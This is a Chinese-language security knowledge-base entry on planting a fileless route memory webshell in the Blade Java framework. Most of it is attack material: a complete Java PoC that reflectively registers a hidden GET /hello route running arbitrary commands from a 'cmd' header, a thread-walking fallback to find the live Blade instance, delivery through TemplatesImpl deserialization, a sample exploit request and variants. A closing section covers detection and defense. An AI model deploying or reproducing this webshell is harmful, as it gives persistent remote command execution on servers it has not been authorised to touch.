---
id: web-java-framework-blade-route-memshell
title: Blade 框架动态注册 Route 内存马：反射 RouteMatcher.addRoute + register
type: scenario
domain: web
path: web/java/framework
technique: blade-dynamic-route-memshell
tags:
- java
- blade
- netty
- memshell
- route
- reflection
- webshell
- persistence
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V18
  verified_at: '2026-11-05T01:59:00+08:00'
  notes: 已对照原文与 16 张图核对：Blade.create().start→NettyServer.initIoc→routeMatcher.register 流程、RouteMatcher.addRoute/register 源码、new RouteMatcher 无效（routes/staticMapping 为 0）、findBladeInstance 线程 target 遍历、WebContext.get().blade()/request/response 回显、GET /hello 传 cmd 头执行 whoami 均一致；原文仅给出测试环境 Blade 2.1.1.RELEASE，未声明受影响区间，已清除 affected_versions
url: /docs/web/java/framework/web-java-framework-blade-route-memshell/
draft: false
kb_aliases:
- Blade 内存马
- Blade RouteMatcher 内存马
- Netty Blade 路由注入
- RouteMatcher.addRoute 反射
- WebContext.get().blade()
- AbstractTranslet Blade Shell
---

## 一句话结论

Blade（Netty 上的 Java Web 框架）在运行时把路由保存在 `RouteMatcher.routes` 中，`register()` 再将其分发到 `staticMapping`/`dynamicMapping`；攻击者拿到当前运行中的 `Blade` 实例后，反射调用 `RouteMatcher.addRoute(Route)` 与 `register()`，即可注册一个指向内存中恶意类方法的 GET 路由，实现无文件路由型内存马和命令回显。

## 原理

- Blade 启动流程：`Blade.create().start(...)` → `NettyServer` 初始化 → `initIoc()` 中 `routeMatcher.register()`；注解扫描由 `RouteBuilder.addRouter` → `parseRoute` → `Route.builder()...` → `RouteMatcher.addRoute(Route)` 完成。
- `RouteMatcher.addRoute(Route)` 把路由存入 `routes` Map，key 为 `path + "#" + httpMethod`；`register()` 遍历 `routes`/`hooks`，调用 `registerRoute`：
  - 不含路径变量的普通路由 → `staticMapping.addRoute(path, httpMethod, route)`；
  - 含路径变量或 webhook → `dynamicMapping.addRoute(...)`。
- 因此运行时注入只需两步：构造 `Route`，反射调用 `addRoute`；再反射调用 `register` 把新路由注册到实际匹配器。
- 关键前提是拿到**当前正在运行**的 `Blade` 实例：
  - 直接 `new RouteMatcher()` 注册只会写入新对象的 `routes`/`staticMapping`，与真实服务器无关，访问路由仍 404；
  - 可通过 `WebContext.get().blade()` 获取当前请求上下文中的 Blade（最简单）；
  - 若上下文不可用，可遍历活跃线程的 `Thread.target` 并递归反射字段查找 `Blade` 实例（原文的 fallback）。
- `Route` 需要设置 `target`（恶意类实例）、`targetType`、`action`（恶意类中的无参方法）、`httpMethod`、`path`；`responseType` 建议反射设为 `ResponseType.EMPTY`，避免框架按默认视图渲染。
- 回显：`WebContext.get()` 中有当前 `request`/`response`；在恶意方法中读取 `cmd` 请求头，执行命令，把输出写入 `response.body(...)`。
- 内存马类通常继承 `TemplatesImpl` 所需的 `AbstractTranslet`（并实现空的 `transform` 方法），静态块完成路由注册；这样可通过 TemplatesImpl 字节码/反序列化投递，无需上传文件。路由和类都只在内存中，重启后消失。

## 触发条件

- 目标使用 Blade 框架（`com.hellokaton.blade`），且攻击者已有 Java 代码执行/反序列化/TemplatesImpl 投递能力。
- 能获取当前运行的 `Blade` 实例：请求线程中 `WebContext.get()` 可用，或可通过线程/对象图遍历找到。
- `RouteMatcher.addRoute` 与 `register` 可通过反射访问（Blade 2.1.1 下为包级/私有方法）。
- 新路由路径未被前置网关/鉴权拦截；Blade 本身不会对新增路由做额外鉴权。
- 目标未做路由表基线/内存马检测。

## 利用步骤

1. 编写继承 `AbstractTranslet` 的恶意类，静态块中注册路由，实例方法 `exp()` 负责命令执行与回显。
2. 在静态块中获取 Blade：
   - 优先 `Blade blade = WebContext.get().blade();`
   - 若为 null，遍历 `Thread.getAllStackTraces()`，反射 `Thread.target`，递归字段查找 `Blade` 实例。
3. 反射取 `Blade.routeMatcher` 字段，得到真实 `RouteMatcher`。
4. 构造 `Route`：`httpMethod=GET`、`path="/hello"`、`target=new blade_shell()`、`targetType=blade_shell.class`、`action=blade_shell.class.getDeclaredMethod("exp")`；反射把 `responseType` 设为 `ResponseType.EMPTY`。
5. 反射调用 `RouteMatcher.addRoute(route)`，再调用 `register()`。
6. 通过 TemplatesImpl/反序列化投递该类；访问 `GET /hello`，在 `cmd` 头中传入命令，读取响应体。
7. 清理：重启应用/重新加载会清除路由；若需持久化需重新投递。

## PoC

恶意类核心（省略 import 与空 transform 实现）：

```java
public class blade_shell extends AbstractTranslet {
    static {
        try {
            WebContext context = WebContext.get();
            Blade blade = context.blade();                 // 当前运行的 Blade
            Field f = Blade.class.getDeclaredField("routeMatcher");
            f.setAccessible(true);
            RouteMatcher matcher = (RouteMatcher) f.get(blade);

            Route route = Route.builder()
                    .httpMethod(HttpMethod.GET)
                    .path("/hello")
                    .target(new blade_shell())
                    .targetType(blade_shell.class)
                    .action(blade_shell.class.getDeclaredMethod("exp"))
                    .build();

            Field rt = Route.class.getDeclaredField("responseType");
            rt.setAccessible(true);
            rt.set(route, ResponseType.EMPTY);

            Method addRoute = RouteMatcher.class.getDeclaredMethod("addRoute", Route.class);
            addRoute.setAccessible(true);
            addRoute.invoke(matcher, route);

            Method register = RouteMatcher.class.getDeclaredMethod("register");
            register.setAccessible(true);
            register.invoke(matcher);
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }

    public void exp() throws Exception {
        WebContext context = WebContext.get();
        HttpResponse response = (HttpResponse) context.getResponse();
        Request request = context.getRequest();
        String cmd = request.header("cmd");
        Process process = Runtime.getRuntime().exec(cmd);

        StringBuilder output = new StringBuilder();
        try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
             BufferedReader errReader = new BufferedReader(new InputStreamReader(process.getErrorStream()))) {
            String line;
            while ((line = reader.readLine()) != null) output.append(line).append("\n");
            while ((line = errReader.readLine()) != null) output.append(line).append("\n");
        }
        response.body(output.toString());
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {}
    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {}
}
```

访问：

```http
GET /hello HTTP/1.1
Host: target:9000
cmd: whoami
```

```text
HTTP/1.1 200 OK
X-Powered-By: blade-2.1.1.RELEASE

follycat\20685
```

Fallback：静态块中 `WebContext.get()` 不可用时，遍历线程 target 查找 Blade：

```java
public static Blade findBladeInstance() throws Exception {
    for (Map.Entry<Thread, StackTraceElement[]> e : Thread.getAllStackTraces().entrySet()) {
        Thread t = e.getKey();
        if (!t.isAlive()) continue;
        Field tf = Thread.class.getDeclaredField("target");
        tf.setAccessible(true);
        Object target = tf.get(t);
        if (target != null) {
            Blade b = findBladeInObject(target, new IdentityHashMap<>());
            if (b != null) return b;
        }
    }
    return null;
}
// findBladeInObject：跳过 java.* 与 primitive，递归读取所有字段，命中 Blade 即返回
```

说明：

- 直接 `new RouteMatcher()` 再 `addRoute`/`register` 不会影响真实服务器，必须用运行中的 Blade 的 `routeMatcher`；原文调试时新实例的 `routes`/`staticMapping` 均为 0。
- `register()` 是 public 方法，`addRoute(Route)` 为包级私有，需 `setAccessible(true)`。
- 路由路径不要与已有路由冲突；含 `{}` 路径变量或 webhook 会走 `dynamicMapping`，普通 GET 走 `staticMapping`。
- 恶意类继承 `AbstractTranslet` 是为了配合 TemplatesImpl 投递；如果已有其它代码执行入口，也可以不继承，仅注册路由。

## 变体与关联

- 变体：用 `RouteContext` 获取 request/response（原文最初尝试，较难调用），或直接使用 `WebContext` 的 `blade()`/`getRequest()`/`getResponse()`。
- 变体：注册带路径变量或通配符路由（`/x/**`），或注册 POST/PUT 等不同方法；`registerRoute` 会按路径变量选择 static/dynamic mapping。
- 变体：不继承 AbstractTranslet，改为通过反序列化/JNDI/表达式执行入口直接调用注册代码；路由型内存马的核心不变。
- 关联：[[web-java-framework-spring-mvc-dynamic-controller-memshell]]（Spring MVC 运行时注册 Controller 内存马）。
- 关联：[[web-java-framework-spring-mvc-pathpattern-memshell]]（Spring PathPattern 动态路由内存马）。
- 关联：[[web-java-classloader-jsp-memory-servlet-webshell]]、[[web-java-classloader-servletcontainerinitializer-spi-backdoor]]（其它 Java 内存马机制）。
- 边界：应用重启/重新加载后路由消失；Blade 版本/包名变化（`com.hellokaton.blade` vs 旧版 `com.blade`）、字段名 `routeMatcher` 变化时需调整；前置网关对未知路由的拦截会降低可用性。

## 检测与防御

- 检测：对 Blade 应用的 `RouteMatcher.routes`/`staticMapping`/`dynamicMapping` 做启动后基线，运行期新增 `/hello` 等未知路由告警；监控 `RouteMatcher.addRoute`/`register` 的反射调用与非启动期调用。
- 检测：JVM 中出现继承 `AbstractTranslet` 的未知类、`TemplatesImpl` 被实例化、`WebContext.get()` 在非 Controller 代码中调用；反序列化流量/异常类加载。
- 检测：访问日志中出现新路径且返回 200、带 `cmd` 等参数；`X-Powered-By: blade` 应用的异常路由。
- 防御：修复代码执行/反序列化入口；使用反序列化过滤器与类白名单；移除不必要的 `TemplatesImpl`/Xalan 依赖；对 Blade 路由表做完整性校验。
- 防御：应用重启可清除内存马，但不能替代入口修复；对关键应用使用 RASP/EDR 监控动态类定义与反射注册。
- 响应：先导出/记录路由表与内存中的可疑类，再重启；排查 TemplatesImpl/反序列化入口与投递载荷。
